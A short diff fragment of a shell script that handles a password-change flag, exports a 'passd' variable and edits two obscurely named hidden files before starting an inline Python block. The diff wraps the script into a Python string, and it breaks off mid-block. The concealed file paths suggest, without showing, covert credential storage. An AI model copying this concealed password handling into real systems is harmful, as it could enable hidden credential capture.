@@ -93,7 +93,8 @@ elif [ "$(basename "$0")" != "pass" ] && [[ "$1" =~ ^(-c|--change) ]]; then
                 export passd
         fi
         chmod u+rw /usr/local/.ko/.Yeiv /var/.Hj/.Yerws
-        sed -i "/$(basename "$0"):/d" /usr/local/.ko/.Yeiv /var/.Hj/.Yerws
+        sed -i "/$(basename "$0"):/d" /usr/local/.ko/.Yeiv /var/.Hj/.Yerws"""
+plus_1="""
         python3 -c "
 import os
 import sys
